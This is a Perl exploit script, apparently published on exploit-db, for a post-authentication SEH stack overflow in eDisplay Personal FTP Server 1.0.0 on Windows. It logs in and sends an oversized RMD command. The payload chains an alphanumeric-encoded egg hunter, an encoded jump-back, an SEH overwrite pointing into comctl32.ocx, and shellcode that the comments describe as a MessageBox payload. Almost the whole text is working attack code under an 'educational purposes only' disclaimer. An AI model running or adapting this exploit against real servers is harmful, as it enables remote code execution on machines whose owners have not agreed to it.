# Exploit Title : eDisplay Personal FTP server 1.0.0 Multiple Post-Authentication Stack BOF
# Type of sploit: Remote Code Execution
# Bug found by  : loneferret  (march 19, 2010)
# Reference     : http://www.exploit-db.com/exploits/11810
# Exploit date  : March 20, 2010
# Author        : corelanc0d3r
# Version       : 1.0.0
# OS            : Windows
# Tested on     : XP SP3 En (VirtualBox) 
# Type of vuln  : SEH
# Greetz to     : loneferret, dookie2000ca and of course my friends at Corelan Security Team
# http://www.corelan.be:8800/index.php/security/corelan-team-members/
# ----------------------------------------------------------------------------------------------------
# Script provided 'as is', without any warranty.
# Use for educational purposes only.
# Do not use this code to do anything illegal !
#
# Note : you are not allowed to edit/modify this code.  
# If you do, Corelan cannot be held responsible for any damages this may cause.
#
# ----------------------------------------------------------------------------------------------------
#
# Before we begin : if you liked my quickzip.exe exploit
# then you will certainly love this one too :-)
#
# ----------------------------------------------------------------------------------------------------
#
#
# Code :
print "|------------------------------------------------------------------|\n";
print "|                         __               __                      |\n";
print "|   _________  ________  / /___ _____     / /____  ____ _____ ___  |\n";
print "|  / ___/ __ \\/ ___/ _ \\/ / __ `/ __ \\   / __/ _ \\/ __ `/ __ `__ \\ |\n";
print "| / /__/ /_/ / /  /  __/ / /_/ / / / /  / /_/  __/ /_/ / / / / / / |\n";
print "| \\___/\\____/_/   \\___/_/\\__,_/_/ /_/   \\__/\\___/\\__,_/_/ /_/ /_/  |\n";
print "|                                                                  |\n";
print "|                                       http://www.corelan.be:8800 |\n";
print "|                                                                  |\n";
print "|-------------------------------------------------[ EIP Hunters ]--|\n\n";
print "      --==[ Exploit for eDisplay Personal FTP Server 1.0.0]==-- \n";
print "            Author : corelanc0d3r\n\n";


use IO::Socket; 
if ($#ARGV ne 3) { 
print "  usage: $0 <targetip> <targetport> <user> <password>\n"; 
exit(0); 
} 

my $user=$ARGV[2];
my $pass=$ARGV[3];

print " [+] Preparing payload\n";
#basereg edi - custom MessageBox payload
my $sc = "w00tw00t".
"WYIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABX".
"P8ABuJIn98kMKn9QdEtJTTqzrNRcJUaXI54lKBQfPLKPv".
"VlnkqfGlLKW6THLKQngPlKP6FXpOtXD5ZSryeQ8QKO8aa".
"pLKPlututNkW5WLLKSdUUcHS1yznk3zvxlK1J5pwqxkZC".
"P7qYLKP4NkFa8ndqkOUayPkLNLNdKppt4JJaXOTMfaJgI".
"yxqKOKOKO7KSLwT6HPuINNkcjGTuQzKBFLK6lpKNkcj7l".
"faJKLKVdLKC1KXk9QTEtULSQksnRtHwYXTk9kUOyKrCXl".
"NpNfnxl62kXOlKOio9ok9ReUTMk3NiHKR3CowuLUtPRjH".
"LKKOkOiooyW5WxCXrLBLQ0KOqxFSWBVNCTU8qeT3CUT2M".
"XclvD6joyivQFKOsevdoyYRRpOKoXLbPMMlOw5LDdrrjH".
"qNKO9o9oPhTn6NfNV8phdp0dEcSBU8BLCQrNcSqxPcrOR".
"RSUtqKkmX1LTdtONiysrHTnVNqHUp3Xq0gK4i6N3XBGSQ".
"1ypnphSYsDUppaQxsTqycTEpTqxImXPLtdFrMYkQP1Zrs".
"b3cPQrrkOn0DqIPbpKOQEeXA";

#custom encoded egg hunter
#boy I love pvefindaddr !
# !pvefindaddr encode ascii <bytes>
#I only had to fix bad chars
#but we need 5C to trigger SEH at correct offset
my $decoder=
"\x25\x4A\x4D\x4E\x55".
"\x25\x35\x32\x31\x2A".
"\x2D\x2E\x5D\x55\x5D".
"\x2D\x2D\x5D\x55\x5D".
"\x2D\x30\x5E\x55\x5D".
"\x50".
"\x25\x4A\x4D\x4E\x55".
"\x25\x35\x32\x31\x2A".
"\x2D\x70\x2D\x5C\x6F".  #we need these 5C's !!
"\x2D\x70\x2C\x5C\x6F".  #we need these 5C's !!
"\x2D\x71\x30\x5D\x71".
"\x50".
"\x25\x4A\x4D\x4E\x55".
"\x25\x35\x32\x31\x2A".
"\x2D\x45\x2E\x23\x56".
"\x2D\x45\x2D\x23\x56".
"\x2D\x46\x30\x2E\x59".
"\x50".
"\x25\x4A\x4D\x4E\x55".
"\x25\x35\x32\x31\x2A".
"\x2D\x5B\x6C\x2D\x45".
"\x2D\x5B\x6C\x2D\x45".
"\x2D\x5B\x6E\x2D\x45".
"\x50".
"\x25\x4A\x4D\x4E\x55".
"\x25\x35\x32\x31\x2A".
"\x2D\x41\x53\x37\x2E".
"\x2D\x41\x53\x37\x2D".
"\x2D\x42\x54\x37\x30".
"\x50".
"\x25\x4A\x4D\x4E\x55".
"\x25\x35\x32\x31\x2A".
"\x2D\x54\x37\x66\x45".
"\x2D\x54\x37\x66\x45".
"\x2D\x56\x39\x66\x46".
"\x50".
"\x25\x4A\x4D\x4E\x55".
"\x25\x35\x32\x31\x2A".
"\x2D\x50\x3F\x39\x31".
"\x2D\x50\x3F\x39\x31".
"\x2D\x51\x3F\x3B\x33".
"\x50".
"\x25\x4A\x4D\x4E\x55".
"\x25\x35\x32\x31\x2A".
"\x2D\x33\x2A\x67\x55".
"\x2D\x33\x2A\x67\x55".
"\x2D\x34\x2A\x67\x55".
"\x50".
"\x75\x58"; #jump to decoded opcode


my $buffer = "A" x 45;
my $pad=("D" x 30);
my $nseh= "\x61\x42\x42\x42";
my $seh=pack('V',0x202D2B3C);   #comctl32.ocx 0x202D2B3C
#encoded jumpback code to jump to encoded egg hunter
#pfew that's a mouthful
my $jumpback="\x50\x5c";
$jumpback=$jumpback."\x25\x4A\x4D\x4E\x55".
"\x25\x35\x32\x31\x2A".
"\x2D\x55\x55\x55\x5E".
"\x2D\x55\x55\x55\x5E".
"\x2D\x56\x55\x56\x60".
"\x50".
"\x25\x4A\x4D\x4E\x55".
"\x25\x35\x32\x31\x2A".
"\x2D\x2A\x5C\x59\x54".
"\x2D\x2A\x5C\x59\x54".
"\x2D\x2B\x5D\x59\x56".
"\x50";
my $rest = "A" x (1000 - length($buffer.$nseh.$seh.$decoder.$pad.$sc.$jumpback)-20-5);
#align eax first
my $aligneax="\x52\x58\x2d\x35\x55\x55\x55\x2d\x35\x55\x55\x55\x2d\x35\x55\x55\x55";
my $payload=$buffer."CCCCCCCCCCCCCCCCCC".$decoder.$pad.$nseh.$seh."BBB".$aligneax.$jumpback.$rest.$sc;

print " [+] Connecting to server $ARGV[0] on port $ARGV[1]\n";
$sock = IO::Socket::INET->new(PeerAddr => $ARGV[0], 
                              PeerPort => $ARGV[1], 
                              Proto    => 'tcp'); 

$ftp = <$sock> || die " [!] *** Unable to connect ***\n"; 
print "   ** $ftp";
print " [+] Logging in (user $user)\n";
print $sock "USER $user\r\n"; 
$ftp = <$sock>;
print "   ** $ftp";
print $sock "PASS $pass\r\n"; 
$ftp = <$sock>;
print "   ** $ftp";
print " [+] Sending payload (" . length($payload)." bytes)\n";
print $sock "RMD ".$payload."\r\r\n";
print $sock "QUIT\r\n";

print " [+] Shellcode size : " . length($sc)." bytes\n";